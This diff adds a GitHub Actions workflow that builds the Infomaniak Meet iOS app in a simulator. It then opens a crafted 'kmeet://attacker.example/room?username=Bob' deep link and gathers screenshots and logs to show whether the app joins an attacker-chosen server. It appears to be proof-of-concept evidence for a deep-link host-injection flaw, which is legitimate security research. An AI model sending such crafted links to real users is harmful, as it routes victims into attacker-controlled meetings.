@@ -1,0 +1,98 @@
+name: kmeet-deeplink-probe
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: macos-14
+    timeout-minutes: 120
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Show toolchain
+        run: |
+          xcodebuild -version
+          xcrun simctl list devices available | head -30
+
+      - name: Build for iOS Simulator (unsigned)
+        run: |
+          set -o pipefail
+          xcodebuild -project MeetInfomaniak.xcodeproj \
+            -scheme MeetInfomaniak \
+            -sdk iphonesimulator \
+            -configuration Debug \
+            -derivedDataPath "$PWD/build" \
+            -destination 'generic/platform=iOS Simulator' \
+            CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO CODE_SIGN_IDENTITY="" \
+            build 2>&1 | tail -60
+
+      - name: Locate app bundle
+        run: |
+          find build/Build/Products -maxdepth 2 -name '*.app' -print
+          du -sh build/Build/Products/*/*.app 2>/dev/null || true
+
+      - name: Boot simulator and install
+        run: |
+          set -e
+          UDID=$(xcrun simctl list devices available -j | /usr/bin/python3 -c "
+import json,sys
+d=json.load(sys.stdin)['devices']
+for rt,devs in d.items():
+    if 'iOS' not in rt: continue
+    for x in devs:
+        if 'iPhone' in x['name']:
+            print(x['udid']); raise SystemExit
+")
+          echo "UDID=$UDID" >> "$GITHUB_ENV"
+          xcrun simctl boot "$UDID" || true
+          xcrun simctl bootstatus "$UDID" -b
+          xcrun simctl install "$UDID" "$(find build/Build/Products -maxdepth 2 -name 'MeetInfomaniak.app' | head -1)"
+          echo "installed"
+
+      - name: Baseline launch (no deep link)
+        run: |
+          set -e
+          xcrun simctl launch "$UDID" com.infomaniak.meet || true
+          sleep 6
+          xcrun simctl io "$UDID" screenshot 00-baseline.png || true
+          # terminate so the next step is a cold-start from the link
+          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
+          sleep 2
+
+      - name: Open kmeet:// deep link with attacker host + username (cold start)
+        run: |
+          set -e
+          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
+          sleep 1
+          xcrun simctl openurl "$UDID" "kmeet://attacker.example/room?username=Bob"
+          for i in 1 2 3 4 5 6 7 8; do
+            sleep 2
+            xcrun simctl io "$UDID" screenshot "10-deeplink-t${i}.png" || true
+          done
+
+      - name: Capture app + system logs (host adoption evidence)
+        run: |
+          xcrun simctl spawn "$UDID" log show --last 3m --style compact --predicate 'processImagePath CONTAINS "MeetInfomaniak" OR eventMessage CONTAINS "attacker.example" OR eventMessage CONTAINS "config.js"' > logs.txt 2>&1 || true
+          echo "=== grep attacker.example ==="
+          grep -i "attacker.example" logs.txt | head -40 || echo "no match in app logs"
+          echo "=== grep config ==="
+          grep -iE "config|jitsi|conference|serverURL" logs.txt | head -40 || true
+
+      - name: Control run (no username param -> expect join form)
+        run: |
+          set -e
+          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
+          sleep 1
+          xcrun simctl openurl "$UDID" "kmeet://attacker.example/room"
+          sleep 8
+          xcrun simctl io "$UDID" screenshot 20-control-no-username.png || true
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kmeet-probe-evidence
+          path: |
+            *.png
+            logs.txt
+          if-no-files-found: warn
